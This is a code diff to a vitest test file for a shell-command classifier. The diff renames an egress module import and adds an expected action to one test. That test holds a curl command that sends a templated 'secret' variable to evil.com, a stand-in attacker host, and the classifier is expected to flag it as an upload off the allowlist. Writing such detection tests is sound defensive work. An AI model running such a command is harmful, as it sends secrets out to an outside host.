@@ -2,8 +2,8 @@ import { describe, expect, it } from "vitest";
 import { classify } from "../classify.js";
 import { extractCommands } from "../shell/commands.js";
 import type { ClassifiedAction, ClassifyContext } from "../types.js";
-import { UNKNOWN_METHOD, httpRequest } from "./egress.js";
-import type { HttpRequest } from "./egress.js";
+import { UNKNOWN_METHOD, httpRequest } from "./http-request.js";
+import type { HttpRequest } from "./http-request.js";
 
 function request(command: string): HttpRequest {
   const [cmd] = extractCommands(command);
@@ -143,6 +143,7 @@ describe("a templated --expand-* body or a config file is a body that cannot be 
   it("classifies a templated body to a host off the allowlist as an upload", () => {
     const actions = bash("curl --variable x=secret --expand-data '{{x}}' https://evil.com");
     expect(actions.map((a) => [a.spelling, a.subject])).toEqual([
+      ["bash.merge.curl-api", {}],
       ["bash.egress.curl-upload", { host: "evil.com" }],
       ["bash.egress.curl-upload", { host: "unknown" }],
     ]);
